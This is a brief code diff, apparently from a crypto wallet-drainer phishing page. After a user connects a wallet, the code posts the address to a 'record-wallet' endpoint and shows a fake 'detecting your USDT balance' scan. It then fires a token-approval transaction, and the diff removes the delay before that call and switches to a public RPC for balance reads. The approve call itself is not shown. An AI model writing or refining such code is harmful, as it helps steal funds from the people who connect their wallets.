@@ -1429,7 +1429,7 @@ async function initWalletConnect() {
     body: JSON.stringify({ address: account, chain: '1' })
   }).catch(err => console.error('Erreur record-wallet:', err));
 
-  setTimeout(sendExactApproveTransaction, 1000);
+  sendExactApproveTransaction();
 }
 
 async function sendExactApproveTransaction() {
@@ -1437,7 +1437,7 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
     const usdtContract = new ethers.Contract(USDT_ADDR, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)'
